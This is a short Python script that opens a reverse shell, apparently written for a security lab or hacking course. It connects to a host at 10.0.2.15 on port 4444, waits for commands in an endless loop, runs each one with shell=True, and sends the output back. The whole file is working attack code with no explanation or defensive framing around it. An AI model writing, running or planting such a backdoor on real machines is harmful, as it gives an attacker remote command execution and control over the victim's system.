#!/usr/bin/env python

import socket
import subprocess


def execute_system_command(command):
    return subprocess.check_output(command, shell=True)


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("10.0.2.15", 4444))
while True:
    # receive max 1024 bytes at a time - buffer size
    command = connection.recv(1024)
    command_result = execute_system_command(command)
    connection.send(command_result)

connection.close()
